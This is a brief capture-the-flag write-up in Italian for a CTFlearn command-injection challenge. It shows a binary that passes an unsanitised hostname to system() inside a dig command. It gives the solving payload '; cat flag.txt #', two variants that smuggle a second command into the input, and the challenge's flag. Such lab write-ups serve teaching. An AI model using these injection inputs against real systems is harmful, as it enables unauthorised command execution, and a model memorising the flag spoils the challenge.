# domain - PWN (Command Injection)

**Flag:** `CTFlearn{1s_c0mm4nd_1nj3ct10n_4_th1ng?}`

## Analisi
Il programma chiede un hostname e lo passa a `system()` dentro il comando:
```
dig %s +short
```
(lo vedi con `strings task | grep dig`). L'input non e' sanificato --> **command injection**.

## Soluzione - passo per passo
Iniettiamo `; cat flag.txt #`: il comando diventa `dig ; cat flag.txt #+short`. Il `;` chiude `dig`, `cat flag.txt` stampa la flag, `#` commenta il `+short` residuo.

1. Entra nella cartella:
   ```
   cd domain
   ```
2. Invia il payload:
   ```
   printf '; cat flag.txt #\n' | ./task
   ```
   Output --> `CTFlearn{1s_c0mm4nd_1nj3ct10n_4_th1ng?}`

### Varianti equivalenti
```
printf '; cat flag.txt ;\n' | ./task
printf '127.0.0.1; cat flag.txt #\n' | ./task
```

